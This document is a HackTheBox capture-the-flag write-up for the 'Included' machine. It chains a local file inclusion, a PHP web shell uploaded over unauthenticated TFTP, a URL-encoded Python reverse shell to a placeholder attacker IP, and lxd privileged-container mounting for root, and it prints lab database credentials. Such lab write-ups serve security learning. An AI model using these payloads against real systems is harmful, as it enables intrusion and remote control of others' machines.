---
description: Included box from HackTheBox write up.
---

# Included

## Nmap scan

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap <MACHINE_IP> -sC -sV -p80          
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-10 20:33 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.052s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://<MACHINE_IP>/?file=index.php

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.56 seconds
```

Only port 80 open so let's check that website

## Port 80

Immediately i noticed that the URL was: `http://<MACHINE_IP>/?file=index.php` so i tried LFI with `http://<MACHINE_IP>/?file=../../../../../../etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false mike:x:1000:1000:mike:/home/mike:/bin/bash tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin 
```

So we have that. I tried `gobuster` and `wfuzz` to try to get more information about the files in the machine but nothing there. I even run a full port scan but no luck.

## More ports?

I noticed that in the `passwd` file we can see a `tftp` user so maybe if we run an UDP scan with `nmap` we would find more open ports?

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sU <MACHINE_IP> -p69                                        130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-10 21:29 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.052s latency).

PORT   STATE         SERVICE
69/udp open|filtered tftp

Nmap done: 1 IP address (1 host up) scanned in 0.92 seconds
```

Ok so maybe we are starting to get our luck back, looks like we have a `tftp` service, a really basic `ftp `(And without authentication!). Let's check it out.

### Tftp service

Instead of using the `tftp` client I preferred Python with the library `tftpy`

```bash
#! /usr/bin/env python3

import tftpy

client = tftpy.TftpClient('<MACHINE_IP>', 69)

# Create a testing file (Looks like gets deleted on upload)
f = open("test.txt", "w")
f.write("Im just a test file!")
f.close()

try:
	client.upload("test_remote.txt", "test.txt", timeout=5)
	print('---------------')
	print('File uploaded!')
	print('---------------')
except Exception as e:
	print(e)
```

I tested the script and it is reporting that the file is being uploaded. Now we need to know where it is, i searched for the service configuration file using the LFI we already have:

```
http://<MACHINE_IP>/?file=../../../../etc/default/tftpd-hpa
# /etc/default/tftpd-hpa TFTP_USERNAME="tftp" TFTP_DIRECTORY="/var/lib/tftpboot" TFTP_ADDRESS=":69" TFTP_OPTIONS="-s -l -c" 
```

And now we know that the files we upload are in `/var/lib/tftpboot` let's try it:

```
http://<MACHINE_IP>/?file=../../../../var/lib/tftpboot/test_remote.txt
Im just a test file! 
```

Cool! I guess we can try to upload something more interesting for us:

```php
<?php
    if(isset($_GET['cmd'])){
    	system($_GET['cmd']);
    }
?>
```

And the result:

```bash
http://<MACHINE_IP>/?file=../../../../var/lib/tftpboot/shell_remote.php&cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

Now we have RCE and we can get a reverse shell! We can use this URL encoded payload:

```
http://<MACHINE_IP>/?file=../../../../var/lib/tftpboot/shell_remote.php&cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22<ATACKER_IP>%22%2C<ATACKER_PORT>%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27
```

## Into the machine

Once into the machine i looked around for a while, run `linpeas`... but I couldn't find anything obvious. After  a while I tried the password `Sheffield19` that we got in the Pathfinder machine and... worked! I guess I should have started with that.

### From mike to root

The user flag is in `/home/mike/user.txt`. I immediately saw that this user is part of the `lxd` group so we can use that for privilege escalation.

```bash
# Import the image
lxc image import ./alpine-v3.14-x86_64-20210909_2211.tar.gz --alias justAnImage

# Init the storage pool as default if it is not
lxd init

# Run the image with security.privileged
lxc init justAnImage nothingBadHere -c security.privileged=true

# Mount the host disk into the container /mnt/root path
lxc config device add nothingBadHere hostDisk disk source=/ path=/mnt/root recursive=true

# Start the container and attach to it
lxc start nothingBadHere
lxc exec nothingBadHere /bin/sh
```

Once into the container we can just go to `/mnt/root` to get access to the host file system as root. Once there, i like to add the SUID bit to the `bash` binary to get root access outside the container with: `bash -p`. The root flag is under `/root/root.txt` and also in the `/root` folder we can see a file called `login.sql`:

```bash
bash-4.4# cat login.sql 
-- MySQL dump 10.16  Distrib 10.1.44-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: Markup
-- ------------------------------------------------------
-- Server version	10.1.44-MariaDB-0ubuntu0.18.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(100) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'Daniel','>SNDv*2wzLWf');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
```

It has new credentials: `Daniel:>SNDv*2wzLWf`
